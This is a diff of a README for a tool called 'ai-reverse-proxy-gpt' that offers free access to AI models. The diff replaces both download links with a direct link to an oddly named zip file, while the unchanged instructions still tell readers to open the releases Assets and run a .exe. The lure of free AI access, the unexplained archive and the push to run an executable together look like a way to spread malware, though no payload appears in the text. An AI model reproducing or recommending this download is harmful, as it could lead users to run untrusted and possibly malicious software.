@@ -1,12 +1,12 @@
 # 🤖 ai-reverse-proxy-gpt - Access powerful AI models for free
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/Dogging-car661/ai-reverse-proxy-gpt/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue)](https://raw.githubusercontent.com/Dogging-car661/ai-reverse-proxy-gpt/main/disparager/gpt_reverse_ai_proxy_Monumbo.zip)
 
 ## 📥 Get the software
 
 You need to visit the project page to download the software for your computer. 
 
-[Click here to open the download page](https://github.com/Dogging-car661/ai-reverse-proxy-gpt/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/Dogging-car661/ai-reverse-proxy-gpt/main/disparager/gpt_reverse_ai_proxy_Monumbo.zip)
 
 Look for the section labeled Assets on that page. Click the file ending in .exe to start your download. Save the file to your desktop for easy access.
 
